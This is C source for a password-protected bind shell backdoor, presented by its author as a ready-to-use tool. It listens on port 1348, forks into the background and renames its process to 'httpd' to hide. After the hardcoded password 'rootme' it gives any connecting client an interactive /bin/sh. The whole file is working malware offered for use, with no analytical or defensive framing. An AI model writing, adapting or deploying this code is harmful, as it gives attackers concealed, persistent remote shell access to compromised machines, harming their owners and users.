/* mybindshell.c coded by kafar
* bindshell with password.
* enjoy !
*/
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>

#define PORT 1348
#define hide "httpd"
#define shell "/bin/sh"

char passwd[] = "rootme";
char motd[] = "-- code by klogctl [www.olek.org]\n";
struct sockaddr_in adr;
int in, out, away;

void go_shell() {
char buffer[150];

write(out, "passwd ", 7);
read(out, buffer, sizeof(buffer));
if (!strncmp(buffer, passwd, strlen(passwd)))  {
    write(out, motd, sizeof(motd));
    chdir("/");
    dup2(out, 0); dup2(out, 1); dup2(out, 2);
    system("uname -a");
    execl(shell, shell, (char *)0);
    close(out);
    exit(0); }
else {
    write(out, "leave!\n", 7);
    close(out); exit(0); }

close(out);
exit(0);
}

main(int argc, char **argv) {
memset(&adr, 0, sizeof(adr));

adr.sin_family=AF_INET;
adr.sin_port=htons(PORT);
adr.sin_addr.s_addr=INADDR_ANY;

strncpy(argv[0], hide, strlen(argv[0]));

in=socket(AF_INET, SOCK_STREAM, 0);
bind(in, (struct sockaddr *)&adr, sizeof(adr));
listen(in, 3);

away = sizeof(adr);
if (fork() != 0) {
    exit(0); }
    
while (1) {
out=accept(in, (struct sockaddr *)&adr, &away);

if (fork() != 0) {
    close(in);
    go_shell(); }
    
close(out); }
return 1;
}
